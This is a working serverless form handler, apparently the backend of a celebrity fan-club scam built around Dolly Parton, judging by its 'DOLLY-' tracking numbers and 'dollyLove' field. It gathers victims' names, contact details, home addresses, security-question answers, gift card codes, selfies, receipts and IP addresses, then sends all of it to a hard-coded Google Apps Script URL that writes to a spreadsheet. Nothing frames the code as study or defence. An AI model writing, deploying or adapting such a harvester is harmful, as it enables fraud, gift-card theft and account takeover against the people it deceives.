const axios = require('axios');

// YOUR GOOGLE SHEETS WEB APP URL - REPLACE WITH YOUR ACTUAL URL
const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwFKieQv4He0NJ4ljzDIu9nnB6ZH0GrShwdxZq9o_g9nlGrZ5SqtWNkVIjQhY6ZFTis/exec';

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let formData;
    
    if (event.headers['content-type'] && event.headers['content-type'].includes('multipart/form-data')) {
      const boundary = event.headers['content-type'].split('boundary=')[1];
      const body = event.body;
      
      formData = {};
      const parts = body.split(`--${boundary}`);
      for (const part of parts) {
        if (part.includes('name="formData"')) {
          const valueStart = part.indexOf('\r\n\r\n') + 4;
          const valueEnd = part.lastIndexOf('\r\n');
          const jsonStr = part.substring(valueStart, valueEnd);
          formData = JSON.parse(jsonStr);
        }
      }
    } else {
      formData = JSON.parse(event.body);
    }

    const trackingNumber = `DOLLY-${Date.now()}-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
    const submissionId = Math.random().toString(36).substr(2, 16);

    const sheetData = {
      trackingNumber: trackingNumber,
      fullName: formData.fullName || '',
      email: formData.email || '',
      phone: formData.phone || '',
      fanDuration: formData.fanDuration || '',
      dollyLove: formData.dollyLove || '',
      securityQ1: formData.securityQ1 || '',
      securityA1: formData.securityA1 || '',
      securityQ2: formData.securityQ2 || '',
      securityA2: formData.securityA2 || '',
      address: formData.address || '',
      city: formData.city || '',
      state: formData.state || '',
      zip: formData.zip || '',
      giftCardCode: formData.giftCardCode || '',
      selfieUrl: formData.selfieUrl || 'Selfie uploaded',
      receiptUrl: formData.receiptUrl || 'No receipt',
      ipAddress: event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown',
      submissionId: submissionId
    };

    const response = await axios.post(GOOGLE_SHEETS_URL, sheetData, {
      headers: { 'Content-Type': 'application/json' }
    });

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Entry submitted successfully!',
        trackingNumber: trackingNumber,
        submissionId: submissionId
      })
    };

  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: 'Failed to submit. Please try again.'
      })
    };
  }
};
